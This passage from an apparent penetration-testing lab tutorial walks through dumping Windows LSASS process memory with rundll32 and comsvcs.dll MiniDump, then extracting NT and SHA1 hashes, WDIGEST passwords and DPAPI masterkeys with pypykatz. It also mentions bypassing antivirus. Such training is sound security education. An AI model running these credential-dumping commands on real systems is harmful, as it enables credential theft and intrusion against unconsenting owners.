#### Finding LSASS's PID in cmd
From cmd, we can issue the command `tasklist /svc` to find `lsass.exe` and its process ID.
```powershell
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
```
From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.
```powershell
# Get-Process | Where-Object Name -like "*lsass*"
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```
#### Creating a dump file using PowerShell
With an elevated PowerShell session, we can issue the following command to create a dump file:
```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing.
If we manage to run this command and generate the `lsass.dmp` file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.
## Using Pypykatz to extract credentials
```
MarcosV999@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
Lets take a more detailed look at some of the useful information in the output.
```
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
    == MSV ==
        Username: bob
        Domain: DESKTOP-33E7O54
        LM: NA
        NT: 64f12cddaa88057e06a81b54e73b949b
        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
        DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the next step of our attack covered at the end of this section.

```
    == WDIGEST [14ab89]==
        username bob
        domainname DESKTOP-33E7O54
        password None
        password (hex)
```
`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text.
```
    == Kerberos ==
        Username: bob
        Domain: DESKTOP-33E7O54
```
[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time.
```
== DPAPI [14ab89]==
        luid 1354633
        key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
        masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
        sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```
Mimikatz and Pypykatz can extract the DPAPI `masterkey` for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.

















